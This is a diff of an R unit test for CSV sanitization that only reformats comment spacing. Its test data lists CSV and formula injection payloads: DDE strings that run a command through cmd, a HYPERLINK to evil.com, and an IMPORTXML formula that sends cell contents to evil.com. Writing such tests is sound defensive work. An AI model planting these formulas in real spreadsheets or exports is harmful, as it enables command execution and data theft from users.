@@ -122,12 +122,12 @@ test_that("CSV sanitization handles real-world malicious payloads", {
   # Real-world CSV injection attacks
   malicious_payloads <- data.frame(
     payload = c(
-      "=1+1+cmd|'/c calc'!A1",  # Command execution attempt
-      "@SUM(1+1)*cmd|'/c calc'!A1",  # DDE attack
-      "+1+1+cmd|'/c calc'!A1",  # Plus variant
-      "-1+1+cmd|'/c calc'!A1",  # Minus variant
-      "=HYPERLINK(\"http://evil.com\",\"Click me\")",  # Hyperlink injection
-      "=IMPORTXML(CONCAT(\"http://evil.com/?\", CONCATENATE(A2:E2)), \"//a\")"  # Data exfiltration
+      "=1+1+cmd|'/c calc'!A1", # Command execution attempt
+      "@SUM(1+1)*cmd|'/c calc'!A1", # DDE attack
+      "+1+1+cmd|'/c calc'!A1", # Plus variant
+      "-1+1+cmd|'/c calc'!A1", # Minus variant
+      "=HYPERLINK(\"http://evil.com\",\"Click me\")", # Hyperlink injection
+      "=IMPORTXML(CONCAT(\"http://evil.com/?\", CONCATENATE(A2:E2)), \"//a\")" # Data exfiltration
     ),
     description = c(
       "Command execution",
